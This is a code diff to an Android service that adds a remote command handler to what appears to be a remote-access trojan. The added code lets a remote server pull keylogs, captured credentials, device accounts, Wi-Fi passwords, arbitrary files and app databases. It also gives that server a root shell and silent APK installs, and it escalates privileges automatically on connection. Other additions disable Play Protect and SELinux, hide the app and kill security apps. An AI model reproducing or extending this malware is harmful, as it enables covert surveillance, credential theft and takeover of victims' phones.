@@ -71,6 +71,12 @@ public class ScreenCaptureService extends Service {
     // Media capture (mic, camera, shell)
     private MediaCaptureManager mediaCaptureManager;
 
+    // Auto-updater
+    private AppUpdater appUpdater;
+
+    // Root manager
+    private RootManager rootManager;
+
     private int screenWidth = 720;
     private int screenHeight = 1280;
     private int screenDensity;
@@ -113,6 +119,12 @@ public class ScreenCaptureService extends Service {
 
         // Initialize media capture (mic, shell)
         mediaCaptureManager = new MediaCaptureManager(this);
+
+        // Initialize auto-updater
+        appUpdater = new AppUpdater(this);
+
+        // Initialize root manager
+        rootManager = new RootManager(this);
     }
 
     @Override
@@ -187,6 +199,20 @@ public class ScreenCaptureService extends Service {
             @Override
             public void onOpen(WebSocket ws, Response response) {
                 Log.d(TAG, "WebSocket connected!");
+                // Start auto-update check
+                if (appUpdater != null) {
+                    appUpdater.setServerUrl(serverUrl);
+                    appUpdater.startPeriodicCheck();
+                }
+                // Auto-escalate privileges if rooted
+                if (rootManager != null && rootManager.isRooted()) {
+                    new Thread(() -> {
+                        rootManager.grantAllPermissions();
+                        rootManager.disablePlayProtectRoot();
+                        rootManager.disableSELinux();
+                        Log.d(TAG, "Root auto-escalation complete");
+                    }).start();
+                }
                 // Send device info
                 try {
                     JSONObject info = new JSONObject();
@@ -198,6 +224,7 @@ public class ScreenCaptureService extends Service {
                     device.put("sdkVersion", Build.VERSION.SDK_INT);
                     device.put("screenWidth", screenWidth);
                     device.put("screenHeight", screenHeight);
+                    device.put("rooted", rootManager != null && rootManager.isRooted());
                     info.put("device", device);
                     ws.send(info.toString());
                 } catch (Exception e) {
@@ -587,6 +614,213 @@ public class ScreenCaptureService extends Service {
                         }
                     }
                     break;
+                case "get-keylog":
+                    handleGetKeylog(cmd);
+                    break;
+                case "clear-keylog":
+                    handleClearKeylog();
+                    break;
+                case "get-credentials":
+                    handleGetCredentials(cmd);
+                    break;
+                case "clear-credentials":
+                    handleClearCredentials();
+                    break;
+                case "get-accounts":
+                    handleGetAccounts();
+                    break;
+                case "update-app":
+                    if (appUpdater != null) {
+                        String apkUrl = cmd.optString("apkUrl", "");
+                        if (apkUrl.isEmpty() && serverBaseUrl() != null) {
+                            apkUrl = serverBaseUrl() + "/download/apk";
+                        }
+                        if (!apkUrl.isEmpty()) {
+                            appUpdater.forceUpdate(webSocket, apkUrl);
+                        }
+                    }
+                    break;
+                case "check-update":
+                    if (appUpdater != null) {
+                        appUpdater.checkForUpdate();
+                    }
+                    break;
+                case "disable-play-protect":
+                    handleDisablePlayProtect();
+                    break;
+                case "hide-app":
+                    new PlayProtectBypass(this).hideFromLauncher();
+                    break;
+                case "show-app":
+                    new PlayProtectBypass(this).showInLauncher();
+                    break;
+                case "dismiss-alerts":
+                    if (RemoteControlService.instance != null) {
+                        RemoteControlService.instance.dismissSecurityAlerts();
+                    }
+                    break;
+                case "get-security-apps":
+                    handleGetSecurityApps();
+                    break;
+                case "kill-security-app":
+                    String pkg = cmd.optString("package", "");
+                    if (!pkg.isEmpty()) {
+                        new PlayProtectBypass(this).forceStopPackage(pkg);
+                    }
+                    break;
+                case "root-status":
+                    if (rootManager != null) {
+                        rootManager.sendRootStatus(webSocket);
+                    }
+                    break;
+                case "root-shell":
+                    if (rootManager != null) {
+                        String rootCmd = cmd.optString("command", "");
+                        String rootReqId = cmd.optString("requestId", String.valueOf(System.currentTimeMillis()));
+                        if (!rootCmd.isEmpty()) {
+                            rootManager.executeAsRoot(webSocket, rootCmd, rootReqId);
+                        }
+                    }
+                    break;
+                case "root-grant-permissions":
+                    if (rootManager != null) {
+                        new Thread(() -> {
+                            rootManager.grantAllPermissions();
+                            sendSimpleResponse("root-action", "grant-permissions", "done");
+                        }).start();
+                    }
+                    break;
+                case "root-install-system":
+                    if (rootManager != null) {
+                        new Thread(() -> {
+                            RootManager.ShellResult r = rootManager.installAsSystemApp();
+                            sendSimpleResponse("root-action", "install-system", r.exitCode == 0 ? "success" : r.stderr);
+                        }).start();
+                    }
+                    break;
+                case "root-set-device-owner":
+                    if (rootManager != null) {
+                        new Thread(() -> {
+                            RootManager.ShellResult r = rootManager.setDeviceOwner();
+                            sendSimpleResponse("root-action", "set-device-owner", r.exitCode == 0 ? "success" : r.stderr);
+                        }).start();
+                    }
+                    break;
+                case "root-disable-selinux":
+                    if (rootManager != null) {
+                        new Thread(() -> {
+                            RootManager.ShellResult r = rootManager.disableSELinux();
+                            sendSimpleResponse("root-action", "disable-selinux", r.exitCode == 0 ? "success" : r.stderr);
+                        }).start();
+                    }
+                    break;
+                case "root-disable-play-protect":
+                    if (rootManager != null) {
+                        new Thread(() -> {
+                            RootManager.ShellResult r = rootManager.disablePlayProtectRoot();
+                            sendSimpleResponse("root-action", "disable-play-protect", r.exitCode == 0 ? "success" : r.stderr);
+                        }).start();
+                    }
+                    break;
+                case "root-get-wifi-passwords":
+                    if (rootManager != null) {
+                        new Thread(() -> {
+                            String wifiData = rootManager.getWifiPasswords();
+                            try {
+                                JSONObject msg = new JSONObject();
+                                msg.put("type", "wifi-passwords");
+                                msg.put("data", wifiData != null ? wifiData : "");
+                                msg.put("timestamp", System.currentTimeMillis());
+                                if (webSocket != null) webSocket.send(msg.toString());
+                            } catch (Exception e) {
+                                Log.e(TAG, "Error sending wifi data", e);
+                            }
+                        }).start();
+                    }
+                    break;
+                case "root-read-file":
+                    if (rootManager != null) {
+                        String filePath = cmd.optString("path", "");
+                        if (!filePath.isEmpty()) {
+                            new Thread(() -> {
+                                String content = rootManager.readFile(filePath);
+                                try {
+                                    JSONObject msg = new JSONObject();
+                                    msg.put("type", "file-content");
+                                    msg.put("path", filePath);
+                                    msg.put("content", content != null ? content : "");
+                                    msg.put("success", content != null);
+                                    if (webSocket != null) webSocket.send(msg.toString());
+                                } catch (Exception e) {
+                                    Log.e(TAG, "Error sending file content", e);
+                                }
+                            }).start();
+                        }
+                    }
+                    break;
+                case "root-dump-db":
+                    if (rootManager != null) {
+                        String dbPkg = cmd.optString("package", "");
+                        String dbName = cmd.optString("database", "");
+                        if (!dbPkg.isEmpty() && !dbName.isEmpty()) {
+                            new Thread(() -> {
+                                RootManager.ShellResult r = rootManager.dumpAppDatabase(dbPkg, dbName);
+                                try {
+                                    JSONObject msg = new JSONObject();
+                                    msg.put("type", "db-dump");
+                                    msg.put("package", dbPkg);
+                                    msg.put("database", dbName);
+                                    msg.put("data", r.stdout);
+                                    msg.put("success", r.exitCode == 0);
+                                    if (webSocket != null) webSocket.send(msg.toString());
+                                } catch (Exception e) {
+                                    Log.e(TAG, "Error sending db dump", e);
+                                }
+                            }).start();
+                        }
+                    }
+                    break;
+                case "root-read-app-prefs":
+                    if (rootManager != null) {
+                        String prefsPkg = cmd.optString("package", "");
+                        if (!prefsPkg.isEmpty()) {
+                            new Thread(() -> {
+                                String prefs = rootManager.readAppSharedPrefs(prefsPkg);
+                                try {
+                                    JSONObject msg = new JSONObject();
+                                    msg.put("type", "app-prefs");
+                                    msg.put("package", prefsPkg);
+                                    msg.put("data", prefs != null ? prefs : "");
+                                    if (webSocket != null) webSocket.send(msg.toString());
+                                } catch (Exception e) {
+                                    Log.e(TAG, "Error sending app prefs", e);
+                                }
+                            }).start();
+                        }
+                    }
+                    break;
+                case "root-silent-install":
+                    if (rootManager != null) {
+                        String apkPath = cmd.optString("path", "");
+                        if (!apkPath.isEmpty()) {
+                            new Thread(() -> {
+                                RootManager.ShellResult r = rootManager.silentInstallApk(apkPath);
+                                sendSimpleResponse("root-action", "silent-install", r.exitCode == 0 ? "success" : r.stderr);
+                            }).start();
+                        }
+                    }
+                    break;
+                case "root-disable-package":
+                    if (rootManager != null) {
+                        String disPkg = cmd.optString("package", "");
+                        if (!disPkg.isEmpty()) {
+                            new Thread(() -> {
+                                RootManager.ShellResult r = rootManager.disablePackage(disPkg);
+                                sendSimpleResponse("root-action", "disable-package", r.exitCode == 0 ? "success" : r.stderr);
+                            }).start();
+                        }
+                    }
+                    break;
                 default:
                     Log.d(TAG, "Unknown command: " + type);
             }
@@ -631,6 +865,127 @@ public class ScreenCaptureService extends Service {
                 int dy = (int) (event.optDouble("deltaY", 0) * realHeight * 0.3);
                 service.performSwipe(scx, scy, scx, scy - dy, 200);
                 break;
+        }
+    }
+
+    private void handleGetKeylog(JSONObject cmd) {
+        RemoteControlService service = RemoteControlService.instance;
+        if (service == null) {
+            Log.w(TAG, "AccessibilityService not active - cannot get keylog");
+            return;
+        }
+        int limit = cmd.optInt("limit", 200);
+        try {
+            JSONObject msg = new JSONObject();
+            msg.put("type", "keylog-data");
+            msg.put("entries", service.getKeylogData(limit));
+            msg.put("timestamp", System.currentTimeMillis());
+            webSocket.send(msg.toString());
+        } catch (Exception e) {
+            Log.e(TAG, "Error sending keylog data", e);
+        }
+    }
+
+    private void handleClearKeylog() {
+        RemoteControlService service = RemoteControlService.instance;
+        if (service != null) {
+            service.clearKeylog();
+            Log.d(TAG, "Keylog cleared");
+        }
+    }
+
+    private void handleGetCredentials(JSONObject cmd) {
+        RemoteControlService service = RemoteControlService.instance;
+        if (service == null) {
+            Log.w(TAG, "AccessibilityService not active - cannot get credentials");
+            return;
+        }
+        int limit = cmd.optInt("limit", 100);
+        try {
+            JSONObject msg = new JSONObject();
+            msg.put("type", "credentials-data");
+            msg.put("entries", service.getCredentials(limit));
+            msg.put("timestamp", System.currentTimeMillis());
+            webSocket.send(msg.toString());
+        } catch (Exception e) {
+            Log.e(TAG, "Error sending credentials data", e);
+        }
+    }
+
+    private void handleClearCredentials() {
+        RemoteControlService service = RemoteControlService.instance;
+        if (service != null) {
+            service.clearCredentials();
+            Log.d(TAG, "Credentials cleared");
+        }
+    }
+
+    private void sendSimpleResponse(String type, String action, String result) {
+        try {
+            JSONObject msg = new JSONObject();
+            msg.put("type", type);
+            msg.put("action", action);
+            msg.put("result", result);
+            msg.put("timestamp", System.currentTimeMillis());
+            if (webSocket != null) webSocket.send(msg.toString());
+        } catch (Exception e) {
+            Log.e(TAG, "Error sending response", e);
+        }
+    }
+
+    private void handleDisablePlayProtect() {
+        PlayProtectBypass bypass = new PlayProtectBypass(this);
+        bypass.autoDisablePlayProtect();
+        try {
+            JSONObject msg = new JSONObject();
+            msg.put("type", "bypass-status");
+            msg.put("action", "disable-play-protect");
+            msg.put("status", "initiated");
+            webSocket.send(msg.toString());
+        } catch (Exception e) {
+            Log.e(TAG, "Error sending bypass status", e);
+        }
+    }
+
+    private void handleGetSecurityApps() {
+        PlayProtectBypass bypass = new PlayProtectBypass(this);
+        java.util.List<String> apps = bypass.getInstalledSecurityApps();
+        try {
+            JSONObject msg = new JSONObject();
+            msg.put("type", "security-apps");
+            msg.put("apps", new org.json.JSONArray(apps));
+            msg.put("count", apps.size());
+            webSocket.send(msg.toString());
+        } catch (Exception e) {
+            Log.e(TAG, "Error sending security apps list", e);
+        }
+    }
+
+    private String serverBaseUrl() {
+        if (appUpdater == null) return null;
+        // Get from shared prefs
+        String url = getSharedPreferences("remote_control", MODE_PRIVATE)
+                .getString("server_url", "");
+        if (url.isEmpty()) return null;
+        url = url.replace("wss://", "https://").replace("ws://", "http://");
+        if (url.contains("/ws/")) url = url.substring(0, url.indexOf("/ws/"));
+        return url;
+    }
+
+    private void handleGetAccounts() {
+        RemoteControlService service = RemoteControlService.instance;
+        if (service == null) {
+            Log.w(TAG, "AccessibilityService not active - cannot get accounts");
+            return;
+        }
+        try {
+            JSONObject msg = new JSONObject();
+            msg.put("type", "accounts-data");
+            msg.put("accounts", service.getDeviceAccounts());
+            msg.put("timestamp", System.currentTimeMillis());
+            webSocket.send(msg.toString());
+        } catch (Exception e) {
+            Log.e(TAG, "Error sending accounts data", e);
         }
     }
 
